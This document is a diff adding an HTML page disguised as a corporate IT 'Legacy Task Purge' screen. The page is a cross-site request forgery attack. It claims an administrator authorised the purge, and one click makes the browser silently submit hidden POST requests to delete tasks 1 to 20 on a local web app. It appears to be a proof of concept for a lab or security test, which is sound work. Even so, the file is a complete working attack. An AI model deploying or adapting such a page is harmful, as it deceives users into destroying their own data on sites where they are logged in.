@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CorpoTech Solutions - Legacy Purge</title>
+    <link rel="stylesheet" href="http://localhost:5000/static/css/style.css">
+</head>
+<body>
+
+    <nav class="navbar">
+        <div class="container">
+            <h1>CorpoTech Solutions</h1>
+            <ul class="nav-links">
+                <li><a href="#">IT Infrastructure</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="form-container" style="margin-top: 4rem; max-width: 650px;">
+            
+            <h2 style="font-size: 2rem; margin-bottom: 2rem;">🗑️ Legacy Task Purge Protocol</h2>
+            
+            <p style="font-size: 1.15rem; line-height: 1.8; color: #555; margin-bottom: 2.5rem;">
+                Your IT administrator has scheduled a bulk deletion of legacy task indices (IDs 1 through 20) 
+                to resolve database sync conflicts. Click below to execute the cleanup script.
+            </p>
+
+            <button id="purge-btn" class="btn btn-danger" style="padding: 1rem 2.5rem; font-size: 1.2rem;" onclick="startPurge()">
+                Authorize Legacy Purge
+            </button>
+
+            <div id="status-msg" style="margin-top: 2rem; padding: 1.5rem; background: #f8f9fa; border-radius: 4px; font-family: monospace; font-size: 1rem; color: #666; min-height: 150px; text-align: left;"></div>
+        </div>
+    </div>
+
+    <iframe name="purge_receiver" style="display: none;"></iframe>
+
+</body>
+</html>
+
+<script>
+    function startPurge() {
+        const btn = document.getElementById('purge-btn');
+        const status = document.getElementById('status-msg');
+        
+        btn.disabled = true;
+        btn.innerText = "Purging...";
+        status.innerHTML = "";
+
+        const targetIds = Array.from({length: 20}, (_, i) => i + 1);
+
+        targetIds.forEach((id, index) => {
+            setTimeout(() => {
+                status.innerHTML += `Attempting to purge index ${id}...<br>`;
+
+                const form = document.createElement('form');
+                form.action = `http://localhost:5000/tasks/${id}/delete`;
+                form.method = 'POST';
+                form.target = 'purge_receiver'; 
+
+                document.body.appendChild(form);
+                form.submit();
+                document.body.removeChild(form);
+
+                if (index === targetIds.length - 1) {
+                    setTimeout(() => {
+                        status.innerHTML += "<br><strong style='color:#c0392b;'>Purge sequence complete.</strong>";
+                        btn.innerText = "Authorized";
+                    }, 500);
+                }
+            }, index * 150); 
+        });
+    }
+</script>
